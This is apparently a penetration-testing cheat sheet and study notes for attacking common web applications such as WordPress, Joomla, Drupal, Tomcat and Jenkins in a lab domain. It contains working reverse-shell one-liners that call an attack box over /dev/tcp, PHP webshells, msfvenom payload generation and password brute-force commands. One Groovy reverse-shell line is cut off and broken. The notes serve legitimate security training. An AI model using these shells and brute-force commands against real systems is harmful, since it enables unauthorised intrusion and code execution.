# Attacking Common Applications

## Cheat Sheet

| Command | Description |
|---------|-------------|
| `sudo vim /etc/hosts` | Opens /etc/hosts with vim to add hostnames |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` | Runs nmap scan on common web ports from scope_list, outputs to web_discovery in all formats |
| `eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>` | Runs eyewitness on nmap XML output, creates directory |
| `cat web_discovery.xml \| ./aquatone -nmap` | Pipes nmap XML to aquatone as nmap input |
| `sudo wpscan --url <http://domainnameoripaddress> --enumerate` | Runs wpscan with enumeration on target URL |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>` | Runs wpscan XMLRPC password attack with rockyou wordlist |
| `curl -s http://<hostnameoripoftargetsite>/path/to/webshell.php?cmd=id` | Executes id command via PHP webshell with curl |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'"); ?>` | PHP code for Linux reverse shell |
| `droopescan scan joomla --url http://<domainnameoripaddress>` | Runs droopescan against Joomla site |
| `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>` | Runs joomla-brute.py with specified wordlist and usernames |
| `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>` | PHP webshell for Drupal, command via GET parameter |
| `curl -s <http://domainname or IP address of site>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d">"` | Executes id via Drupal webshell with curl |
| `gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` | Directory brute force with gobuster and wordlist |
| `auxiliary/scanner/http/tomcat_mgr_login` | Metasploit module for Tomcat manager brute force |
| `python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt` | Runs mgr_brute.py against Tomcat /manager with default creds lists |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war` | Generates JSP reverse shell WAR payload |
| `nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>` | Nmap version scan for Tomcat and AJP ports |
| `r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()` | Groovy Linux reverse shell for Jenkins Script Console |
| `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");` | Groovy command execution for Windows Jenkins Script Console |
| `String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);` | Groovy Windows reverse shell for Jenkins Script Console |
| [`reverse_shell_splunk`](https://github.com/0xjpuff/reverse_shell_splunk) | Splunk package for reverse shells on Windows/Linux |

## Enumeration Tools

- [Eyewitness](https://github.com/RedSiege/EyeWitness)
```bash
sudo apt install eyewitness
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

- [Aquatone](https://github.com/michenriksen/aquatone)
```bash
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
echo $PATH
```
- move to a $PATH location(```/usr/local/bin```) or current working folder
```bash
cat web_discovery.xml | ./aquatone -nmap
```

## Example note layout

External Penetration Test - <Client Name>
- Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
- Client Points of Contact
- Credentials
- Discovery/Enumeration
    - Scans
    - Live hosts
- Application Discovery
    - Scans
    - Interesting/Notable Hosts
- Exploitation
    - \<Hostname or IP\>
    - \<Hostname or IP\>
- Post-Exploitation
    - \<Hostname or IP\>
    - \<Hostname or IP\>

## Wordpress

### Manual Enumeration

- ```robots.txt``` - can quickly identify if WordPress used
- ```curl -s http://blog.inlanefreight.local | grep WordPress``` - another quick identification method
- ```wp-content/plugins``` - plugins directory
- ```wp-content/themes``` - themes directory
- WordPress user typses on a standard installation
    1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
    2. Editor: An editor can publish and manage posts, including the posts of other users.
    3. Author: They can publish and manage their own posts.
    4. Contributor: These users can write and manage their own posts but cannot publish them.
    5. Subscriber: These are standard users who can browse posts and edit their profiles.
- Manually browse and look at page source
- Grep for wp-content directory, themes and plugin:
```bash
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
```
- Enumerate versions of found plugins
    - Check for ```readme.txt``` in their directories i.e: ```http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt```
    - Check for vulnerabilities of found versions
- Continue enumaration on other pages i.e: ```curl -s http://blog.inlanefreight.local/?p=1 | grep plugins```
- Try some manual enumeration of usernames and/or passwords at the default login page ```http://blog.inlanefreight.local/wp-login.php``` (testing for different error messages; correct user wrong password etc)

### WPScan

- [WPVulnDB](https://wpvulndb.com/) to obtain API token
```bash
sudo gem install wpscan
wpscan -h
```
- Default enumeration (plugins, themes, users, media, and backups):
```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB\<SNIP\>
```
- Default threads used is 5, change with ```-t``` flag.